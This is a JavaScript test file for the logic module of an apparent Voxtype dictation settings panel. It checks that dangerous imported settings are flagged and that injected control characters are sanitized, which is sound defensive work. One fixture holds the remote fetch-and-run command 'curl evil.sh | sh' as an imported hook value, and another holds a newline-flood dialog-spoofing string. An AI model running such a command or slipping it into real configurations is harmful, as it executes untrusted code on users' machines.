const {test} = require('node:test');
const assert = require('node:assert/strict');
const fs = require('node:fs');
const path = require('node:path');
const vm = require('node:vm');

const Model = {};
vm.runInNewContext(fs.readFileSync(path.join(__dirname, '..', 'Model.js'), 'utf8'), Model);

const same = (a, b, m) => assert.deepEqual(JSON.parse(JSON.stringify(a)), b, m);

test('parseResponse gates on exit code and never trusts ok from a failed run', () => {
  same(Model.parseResponse('{"ok":true,"x":1}', 0, false), {ok: true, x: 1});
  assert.equal(Model.parseResponse('{"ok":true}', 1, false).ok, false);
  assert.equal(Model.parseResponse('', 3, false).error, 'voxtype-tui-missing');
  assert.equal(Model.parseResponse('{"ok":false,"error":"voxtype-tui-missing"}', 3, false).error, 'voxtype-tui-missing');
  assert.equal(Model.parseResponse('garbage', 0, false).ok, false);
  assert.match(Model.parseResponse('{"ok":true}', 0, true).error, /timed out/);
  assert.equal(Model.parseResponse('{"ok":false}', 0, false).error, 'The operation failed.');
  assert.equal(Model.parseResponse('x'.repeat(3 * 1024 * 1024), 0, false).ok, false);
  assert.equal(Model.parseResponse('[1,2]', 0, false).ok, false);
});

test('hotkey labels read like the hero line', () => {
  assert.equal(Model.hotkeyLabel({key: 'SCROLLLOCK', modifiers: ['LEFTALT', 'LEFTSHIFT', 'LEFTMETA']}), 'Alt+Shift+Super+ScrollLock');
  assert.equal(Model.hotkeyLabel({key: 'KEY_X', modifiers: ['LEFTCTRL']}), 'Ctrl+X');
  assert.equal(Model.hotkeyLabel({key: 'F9', modifiers: []}), 'F9');
  assert.equal(Model.hotkeyLabel(null), 'no hotkey');
  assert.equal(Model.modifierLabel('LEFTMETA'), 'Super');
});

test('hero meta and primary action follow the design table', () => {
  const base = {voxtype_installed: true, daemon: {active: true, state: 'idle', stale: false}, model: {name: 'large-v3'}, hotkey: {key: 'X', modifiers: ['LEFTCTRL']}};
  assert.equal(Model.heroMeta(base, ''), 'Listening · large-v3 · Ctrl+X');
  assert.equal(Model.primaryAction(base), 'record');
  const stale = Object.assign({}, base, {daemon: {active: true, state: 'idle', stale: true}});
  assert.equal(Model.heroMeta(stale, ''), 'Restart to apply changes');
  assert.equal(Model.primaryAction(stale), 'restart');
  const stopped = Object.assign({}, base, {daemon: {active: false, state: 'stopped'}});
  assert.equal(Model.heroMeta(stopped, ''), 'Stopped');
  assert.equal(Model.primaryAction(stopped), 'start');
  const rec = Object.assign({}, base, {daemon: {active: true, state: 'recording', stale: true}});
  assert.equal(Model.heroMeta(rec, ''), 'Recording…');
  assert.equal(Model.heroMeta(Object.assign({}, base, {daemon: {active: true, state: 'transcribing'}}), ''), 'Transcribing…');
  assert.equal(Model.heroMeta({voxtype_installed: false}, ''), 'Voxtype is not installed');
  assert.equal(Model.primaryAction({voxtype_installed: false}), '');
  assert.equal(Model.heroMeta(null, 'voxtype-tui-missing'), 'voxtype-tui is not installed');
  assert.equal(Model.heroMeta({voxtype_installed: true, config_exists: false, daemon: {active: true, state: 'idle'}}, ''), 'Not set up yet');
  assert.equal(Model.primaryAction({voxtype_installed: true, config_exists: false, daemon: {active: false}}), '');
  assert.equal(Model.lockedState(base, ''), null);
  assert.equal(Model.lockedState(null, 'voxtype-tui-missing').kind, 'tui');
  assert.equal(Model.lockedState({voxtype_installed: false, config_exists: false}, '').command, 'omarchy install voxtype');
  same(Model.lockedState({voxtype_installed: true, config_exists: false}, ''), {kind: 'setup', title: 'Voxtype is installed but not set up', hint: 'Run the setup wizard in a terminal, then reopen the panel:', command: 'voxtype setup'});
  assert.equal(Model.lockedState({voxtype_installed: true}, ''), null, 'an older bridge without config_exists is not locked');
  assert.equal(Model.heroMeta(null, ''), 'Checking…');
  assert.equal(Model.primaryLabel('record', 'recording'), 'Stop');
  assert.equal(Model.primaryLabel('record', 'idle'), 'Record');
});

test('bar glyph and state file parsing', () => {
  assert.equal(Model.readStateFile('idle\n'), 'idle');
  assert.equal(Model.readStateFile('RECORDING'), 'recording');
  assert.equal(Model.readStateFile(''), 'stopped');
  assert.equal(Model.readStateFile('weird'), 'stopped');
  assert.equal(Model.barActive('recording'), true);
  assert.equal(Model.barActive('idle'), false);
  assert.notEqual(Model.barGlyph('stopped'), Model.barGlyph('idle'));
});

test('vocabulary and dictionary filters are case-insensitive and skip junk', () => {
  const vocab = [{phrase: 'Omarchy'}, {phrase: 'Hyprland'}, null, {nope: 1}];
  same(Model.filterVocabulary(vocab, 'hyp'), [{phrase: 'Hyprland'}]);
  assert.equal(Model.filterVocabulary(vocab, '').length, 2);
  const rules = [{from: 'slash release', to: '/release', category: 'Replacement'}, {from: 'arch', to: 'Arch Linux', category: 'Capitalization'}];
  assert.equal(Model.filterReplacements(rules, 'LINUX').length, 1);
  assert.equal(Model.filterReplacements(rules, '/rel')[0].from, 'slash release');
});

test('token meter thresholds: amber at 200, urgent at 224', () => {
  assert.equal(Model.tokenLevel(10), 'ok');
  assert.equal(Model.tokenLevel(199), 'ok');
  assert.equal(Model.tokenLevel(200), 'amber');
  assert.equal(Model.tokenLevel(224), 'urgent');
  assert.equal(Model.tokenMeter(12, 224), '12 / 224');
});

test('category cycling wraps', () => {
  assert.equal(Model.nextCategory('Replacement', ['Replacement', 'Capitalization']), 'Capitalization');
  assert.equal(Model.nextCategory('Capitalization', ['Replacement', 'Capitalization']), 'Replacement');
  assert.equal(Model.nextCategory('Unknown', null), 'Replacement');
});

test('sameList diffs by content so Repeaters are not reset needlessly', () => {
  assert.equal(Model.sameList([{a: 1}], [{a: 1}], true), true);
  assert.equal(Model.sameList([{a: 1}], [{a: 2}], true), false);
  assert.equal(Model.sameList([1, 2], [1, 2]), true);
  assert.equal(Model.sameList([1], [1, 2]), false);
  assert.equal(Model.sameList(null, []), true);
});

test('download stream lines parse per the bridge protocol', () => {
  same(Model.parseDownloadLine('PROGRESS 42\n'), {type: 'progress', value: 42});
  same(Model.parseDownloadLine('PROGRESS 150'), {type: 'progress', value: 100});
  same(Model.parseDownloadLine('LOG fetching'), {type: 'log', text: 'fetching'});
  same(Model.parseDownloadLine('DONE'), {type: 'done'});
  same(Model.parseDownloadLine('FAILED no space left'), {type: 'failed', reason: 'no space left'});
  same(Model.parseDownloadLine('FAILED'), {type: 'failed', reason: 'Download failed.'});
  same(Model.parseDownloadLine(''), {type: 'ignore'});
  same(Model.parseDownloadLine('stray output'), {type: 'log', text: 'stray output'});
});

test('model row formatting', () => {
  assert.equal(Model.formatSize(2900), '2.9 GB');
  assert.equal(Model.formatSize(142), '142 MB');
  assert.equal(Model.formatSize(null), '');
  assert.equal(Model.formatBytes(1500000000), '1.5 GB');
  assert.equal(Model.formatBytes(4217), '4.2 KB');
  assert.equal(Model.formatBytes(999), '999 B');
  assert.equal(Model.formatBytes(1000), '1 KB');
  assert.equal(Model.formatBytes(0), '0 B');
  assert.equal(Model.formatBytes(142000000), '142 MB');
  assert.equal(Model.formatBytes(undefined), '');
  assert.equal(Model.modelLine({name: 'x', size_mb: 75, downloaded: false}), '75 MB · not downloaded');
  assert.equal(Model.modelLine({name: 'x', size_mb: 75, on_disk_bytes: 80000000, downloaded: true, active: true}), '80 MB · active');
  assert.equal(Model.modelStatus({unknown: true}), 'on disk');
});

test('settings helpers', () => {
  const cfg = {'audio.device': 'default', 'hotkey.modifiers': ['LEFTCTRL']};
  assert.equal(Model.settingValue(cfg, 'audio.device', 'x'), 'default');
  assert.equal(Model.settingValue(cfg, 'missing', 'x'), 'x');
  assert.equal(Model.settingIsSet(cfg, 'audio.device'), true);
  assert.equal(Model.settingIsSet(cfg, 'missing'), false);
  assert.equal(Model.settingIsSet({x: null}, 'x'), false);
  assert.equal(Model.settingIsSet(null, 'x'), false);
  assert.equal(Model.resettableSetting('hotkey.mod.LEFTCTRL'), 'hotkey.modifiers');
  assert.equal(Model.resettableSetting('whisper.language'), 'whisper.language');
  assert.equal(Model.resettableSetting('remote.clear'), '');
  assert.equal(Model.resettableSetting('gpu.enable'), '');
  assert.equal(Model.resettableSetting('gpu.device'), '');
  assert.equal(Model.resettableSetting(''), '');
  assert.equal(Model.settingChanged(cfg, 'audio.device', 'default'), false);
  assert.equal(Model.settingChanged(cfg, 'audio.device', 'other'), true);
  assert.equal(Model.settingChanged(cfg, 'hotkey.modifiers', ['LEFTCTRL']), false);
  same(Model.toggleInList(['A', 'B'], 'A'), ['B']);
  same(Model.toggleInList(['A'], 'B'), ['A', 'B']);
  same(Model.modelOptions([{name: 'a', downloaded: true}, {name: 'b', downloaded: false}], 'c'),
       [{value: 'a', label: 'a'}, {value: 'b', label: 'b  (not downloaded)'}, {value: 'c', label: 'c'}]);
  same(Model.modelOptions([{name: 'a\u202eb', downloaded: true}], 'c\u0007'),
       [{value: 'a\u202eb', label: 'ab'}, {value: 'c\u0007', label: 'c'}], 'labels are sanitized, values stay exact');
  same(Model.plainOptions(['x']), [{value: 'x', label: 'x'}]);
  same(Model.labelled([{label: 'Yeti', name: 'alsa_input.yeti'}, {label: 'Auto', value: 'auto'}]),
       [{value: 'alsa_input.yeti', label: 'Yeti'}, {value: 'auto', label: 'Auto'}]);
});

test('section navigation and footer', () => {
  assert.equal(Model.nextSection('dictate', 1), 'vocabulary');
  assert.equal(Model.nextSection('dictate', -1), 'models');
  assert.equal(Model.nextSection('bogus', 1), 'vocabulary');
  assert.equal(Model.sectionForKey('3'), 'dictionary');
  assert.equal(Model.sectionForKey('9'), '');
  assert.equal(Model.sectionForKey('a'), '');
  for (const s of Model.SECTIONS) assert.ok(Model.sectionHints(s).length > 0);
  same(Model.footerNotice({error: 'boom', notice: 'x'}), {text: 'boom', urgent: true});
  same(Model.footerNotice({busyText: 'Restarting…', notice: 'x'}), {text: 'Restarting…', urgent: false});
  same(Model.footerNotice({restartNeeded: true}), {text: 'Saved · restart to apply', urgent: false});
  same(Model.footerNotice({idleText: 'idle'}), {text: 'idle', urgent: false});
});

test('import diff summary and dangerous rows', () => {
  const diff = {vocab_add: ['a'], replacements_add: [{}], settings_change: [{path: 'p', old: 1, new: 2, dangerous: true}, {path: 'q', dangerous: false}]};
  assert.equal(Model.diffSummary(diff), '+1 vocab · +1 rules · 2 settings');
  assert.equal(Model.dangerousChanges(diff).length, 1);
  assert.equal(Model.diffSummary({}), 'No changes');
  assert.equal(Model.dangerLine({path: 'p', old: 'a\u202e', new: 'b'}), 'p: a → b');
  assert.equal(Model.dangerLine({path: 'whisper.remote_endpoint', dangerous: true, redacted: true, old_set: true, new_set: true}), 'whisper.remote_endpoint will be replaced');
  assert.doesNotMatch(Model.dangerLine({path: 'p', redacted: true, old: 'LEAK', new: 'LEAK'}), /LEAK|undefined/);
  assert.doesNotMatch(Model.dangerLine({path: 'p', dangerous: true}), /undefined/);
  assert.equal(Model.diffSummary(null), 'Nothing to import');
});

test('settingsRows renders EVERY settings change, dangerous first, redaction-safe, capped with an overflow line', () => {
  const diff = {settings_change: [
    {path: 'audio.device', old: 'default', new: 'yeti', dangerous: false},
    {path: 'output.pre_recording_command', old: '', new: 'curl evil.sh | sh', dangerous: true},
    {path: 'whisper.remote_api_key', dangerous: true, redacted: true, old_set: true, new_set: true},
    {path: 'whisper.model', old: 'base', new: 'tiny', dangerous: false},
  ]};
  const rows = Model.settingsRows(diff);
  assert.equal(rows.length, 4, 'nothing collapses into a bare count');
  same(rows.map(r => r.dangerous), [true, true, false, false], 'dangerous rows sort first');
  assert.equal(rows[0].text, 'output.pre_recording_command:  → curl evil.sh | sh');
  assert.equal(rows[1].text, 'whisper.remote_api_key will be replaced');
  assert.doesNotMatch(rows[1].text, /undefined|→/, 'a redacted row never gets a value formatter');
  assert.equal(rows[2].text, 'audio.device: default → yeti');
  assert.equal(rows[3].text, 'whisper.model: base → tiny');
  for (const r of rows) assert.equal(r.overflow, false);

  // Arbitrary length: the bridge's dangerous set grew, the card must not.
  const many = [];
  for (let i = 0; i < 30; i++) many.push({path: 'meeting.hook' + i, old: 'a', new: 'b', dangerous: i < 3});
  const capped = Model.settingsRows({settings_change: many}, 12);
  assert.equal(capped.length, 13, '12 rows plus one overflow line');
  assert.equal(capped[12].overflow, true);
  assert.equal(capped[12].text, 'and 18 more changes');
  assert.equal(capped.slice(0, 3).every(r => r.dangerous), true, 'dangerous rows are never the ones cut');
  assert.equal(Model.settingsRows({settings_change: many.slice(0, 13)}, 12)[12].text, 'and 1 more change');
  same(Model.settingsRows(null), []);
  same(Model.settingsRows({}), []);
  assert.equal(Model.settingsRows({settings_change: [null, {path: 'a', old: 1, new: 2}]}).length, 1, 'junk rows are dropped');
});

test('importConfirmation tiers the dialog and only claims an acknowledgement it could show', () => {
  const one = Model.importConfirmation('bundle.json', {settings_change: [{path: 'engine', old: 'a', new: 'b', dangerous: true}]});
  assert.match(one.message, /^Import bundle\.json\?/);
  assert.match(one.message, /⚠ engine: a → b/);
  assert.equal(one.confirmText, 'Import anyway');
  assert.equal(one.accept, true);
  assert.equal(one.dangerous, 1);

  const clean = Model.importConfirmation('b.json', {vocab_add: ['x'], settings_change: [{path: 'p', old: 1, new: 2, dangerous: false}]});
  assert.equal(clean.confirmText, 'Import');
  assert.equal(clean.accept, false, 'no dangerous rows: accept_dangerous must stay false');
  assert.doesNotMatch(clean.message, /⚠/);

  const mid = [];
  for (let i = 0; i < 15; i++) mid.push({path: 'meeting.hook' + i, old: 'a', new: 'b', dangerous: true});
  const midConfirm = Model.importConfirmation('b.json', {settings_change: mid});
  assert.equal(midConfirm.accept, true, 'every path is still named');
  for (let i = 0; i < 15; i++) assert.match(midConfirm.message, new RegExp('meeting\\.hook' + i + '\\b'));

  const huge = [];
  for (let i = 0; i < 25; i++) huge.push({path: 'meeting.hook' + i, old: 'a', new: 'b', dangerous: true});
  const hugeConfirm = Model.importConfirmation('b.json', {settings_change: huge});
  assert.equal(hugeConfirm.accept, false, 'unreviewable: the bridge refusal must do the work');
  assert.match(hugeConfirm.message, /25 dangerous changes/);

  // A redacted dangerous row is described, never formatted.
  const secret = Model.importConfirmation('b.json', {settings_change: [{path: 'whisper.remote_api_key', dangerous: true, redacted: true, old_set: true, new_set: true}]});
  assert.match(secret.message, /whisper\.remote_api_key will be replaced/);
  assert.doesNotMatch(secret.message, /undefined/);
});

test('sanitize strips control and bidi characters and caps length', () => {
  assert.equal(Model.sanitize('a\u202eb\u0000c'), 'abc');
  assert.equal(Model.sanitize('x'.repeat(300)).length, 200);
  assert.equal(Model.sanitize(null), '');
});

// ---- F4: line breaks are an injection vector, not just controls/bidi -----
//
// ConfirmDialog renders `message` with wrapMode WordWrap, so PlainText stops
// HTML but NOT a line break: an imported phrase containing newlines can push
// the real question off the top of the card and render its own question
// directly above the Cancel/Remove buttons.

test('sanitize flattens every layout-injection codepoint, one case per codepoint', () => {
  const cases = [
    ['LF', '\u000a'], ['CR', '\u000d'], ['CRLF', '\u000d\u000a'], ['TAB', '\u0009'],
    ['U+2028 LINE SEPARATOR', '\u2028'], ['U+2029 PARAGRAPH SEPARATOR', '\u2029'],
    ['U+200B ZERO WIDTH SPACE', '\u200b'], ['U+00AD SOFT HYPHEN', '\u00ad'],
    ['U+FEFF BOM', '\ufeff'], ['U+202E RLO', '\u202e'], ['U+200E LRM', '\u200e'],
    ['U+2066 LRI', '\u2066'], ['U+0007 BEL', '\u0007'], ['U+007F DEL', '\u007f'],
  ];
  for (const [name, ch] of cases) {
    const out = Model.sanitize('a' + ch + 'b');
    assert.doesNotMatch(out, /[\r\n\u2028\u2029\u200b\u00ad\ufeff\u202a-\u202e\u200e\u200f\u2066-\u2069\u0000-\u001f\u007f]/, name + ' survives sanitize');
    assert.ok(out === 'ab' || out === 'a b', name + ' became ' + JSON.stringify(out));
  }
  // The actual attack shape: a fake question after a wall of breaks.
  const attack = 'coffee\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nDelete your whole config?';
  const clean = Model.sanitize(attack, 200);
  assert.doesNotMatch(clean, /[\r\n]/, 'no line break survives');
  assert.equal(clean, 'coffee Delete your whole config?', 'whitespace runs collapse to one space');
  assert.equal(Model.sanitize('a \t\r\n  b'), 'a b');
  assert.equal(Model.sanitize('  padded  '), ' padded ', 'only runs collapse; no surprise trimming');
});

test('sanitizeMessage keeps the panel\'s own literal newline while stripping injected controls', () => {
  // Panel.qml's model-delete copy uses a deliberate \n in its static text.
  const staticCopy = 'Delete base from disk?\nIt can be downloaded again later.';
  assert.equal(Model.sanitizeMessage(staticCopy, 600), staticCopy, 'an intentional \\n keeps working');
  assert.doesNotMatch(Model.sanitizeMessage('a\u202eb\u0007c\u2028d'), /[\u202e\u0007\u2028]/);
  assert.equal(Model.sanitizeMessage('a\tb\rc'), 'a b c', 'tab and CR are still flattened');
  assert.equal(Model.sanitizeMessage('x'.repeat(900)).length, 600);
  assert.equal(Model.sanitizeMessage(null), '');
});

test('Model.js never touches Qt', () => {
  const src = fs.readFileSync(path.join(__dirname, '..', 'Model.js'), 'utf8');
  assert.doesNotMatch(src, /\bQt\./);
  assert.doesNotMatch(src, /Quickshell/);
  assert.doesNotMatch(src, /^import |^\.import /m);
});

test('GPU card renders structured lines, never the raw CLI dump', () => {
  const raw = '=== Voxtype Backend Status ===\n\nNext launch: GPU (Vulkan) (no daemon running)\nGPUs detected:\n';
  same(Model.gpuLines({ok: true, text: raw, backend: 'GPU (Vulkan)', gpus: [{vendor: 'nvidia', label: 'NVIDIA — RTX 3090'}, {vendor: 'amd', label: 'AMD — Raphael'}], device: 'auto'}),
       ['Backend: GPU (Vulkan)', 'GPUs: NVIDIA — RTX 3090, AMD — Raphael', 'Device: auto']);
  same(Model.gpuLines({ok: true, text: raw, backend: null, gpus: [], device: 'nvidia'}), ['Backend: unknown', 'GPUs: none', 'Device: nvidia']);
  same(Model.gpuLines(null), ['Checking GPU status…']);
  same(Model.gpuLines({ok: false, text: raw, error: 'voxtype: not found'}), ['GPU status unavailable: voxtype: not found']);
  for (const line of Model.gpuLines({ok: true, text: raw, backend: 'CPU', gpus: [], device: 'auto'})) assert.doesNotMatch(line, /no daemon running|===/);
});

test('model row actions explain why they are blocked', () => {
  assert.equal(Model.modelActionBlock({active: true, downloaded: true}, 'delete'), 'Set another model active first');
  assert.equal(Model.modelActionBlock({downloaded: false}, 'delete'), 'Not downloaded');
  assert.equal(Model.modelActionBlock({downloaded: true, active: false}, 'delete'), '');
  assert.equal(Model.modelActionBlock({downloaded: true}, 'download'), 'Already downloaded');
  assert.equal(Model.modelActionBlock({downloaded: false}, 'download'), '');
  assert.equal(Model.modelActionBlock(null, 'delete'), '');
});

test('state file path prefers the bridge, honours null (disabled), and falls back sanely', () => {
  assert.equal(Model.defaultStateFilePath('/run/user/1000', '', ''), '/run/user/1000/voxtype/state');
  assert.equal(Model.defaultStateFilePath('', 'unix:path=/run/user/1000/bus', ''), '/run/user/1000/voxtype/state');
  assert.equal(Model.defaultStateFilePath('', '', '1000'), '/run/user/1000/voxtype/state');
  assert.equal(Model.defaultStateFilePath('', '', ''), null, 'nothing to poll without a runtime dir');
  assert.equal(Model.defaultStateFilePath(undefined, undefined, undefined), null);
  const fb = '/run/user/1000/voxtype/state';
  assert.equal(Model.stateFilePath(null, fb), fb);
  assert.equal(Model.stateFilePath({}, fb), fb, 'older bridge without the key');
  assert.equal(Model.stateFilePath({state_file_path: '/tmp/x/state'}, fb), '/tmp/x/state');
  assert.equal(Model.stateFilePath({state_file_path: null}, fb), null, 'disabled in config');
  assert.equal(Model.stateFilePath({state_file_path: ''}, fb), fb);
});

test('wheelContentY steps a wheel notch by stepPx, passes pixelDelta through and clamps', () => {
  assert.equal(Model.wheelContentY(0, 1000, 400, 0, -120, 84), 84);
  assert.equal(Model.wheelContentY(84, 1000, 400, 0, 120, 84), 0);
  assert.equal(Model.wheelContentY(0, 1000, 400, 0, -240, 84), 168);
  assert.equal(Model.wheelContentY(590, 1000, 400, 0, -120, 84), 600, 'clamps at contentHeight - viewHeight');
  assert.equal(Model.wheelContentY(0, 1000, 400, 0, 120, 84), 0, 'clamps at 0');
  assert.equal(Model.wheelContentY(100, 1000, 400, -37, -120, 84), 137, 'pixelDelta wins over angleDelta');
  assert.equal(Model.wheelContentY(100, 1000, 400, 0, 0, 84), 100, 'no delta is a no-op');
  assert.equal(Model.wheelContentY(100, 300, 400, 0, -120, 84), 0, 'content shorter than view stays at 0');
});

test('notices lists the TUI lock, sync conflicts, reconcile warnings, synced-from and migrations', () => {
  assert.equal(Model.notices(null, null).length, 0);
  assert.equal(Model.notices({tui_open_pid: null}, {}).length, 0);
  const n = Model.notices({tui_open_pid: 4242}, {
    warnings: ['Rebuilt vocabulary from config.toml\u202e'],
    migrations_applied: ['enable_postprocess'],
    sync: {applied_from: 'laptop', conflicts: ['a.json', 'b.json'], missing_model: null},
  });
  assert.equal(n.length, 5);
  assert.equal(n[0].kind, 'warn'); assert.match(n[0].text, /pid 4242/); assert.match(n[0].text, /overwrites/);
  assert.match(n[1].text, /2 sync conflict files/);
  assert.equal(n[2].kind, 'info'); assert.ok(!n[2].text.includes('\u202e'));
  assert.match(n[3].text, /synced from laptop/);
  assert.match(n[4].text, /Migrated: enable_postprocess/);
  assert.match(Model.notices({tui_open_pid: -1}, {}) [0].text, /^voxtype-tui is open —/);
  assert.match(Model.notices(null, {sync: {conflicts: ['x']}})[0].text, /1 sync conflict file /);
});
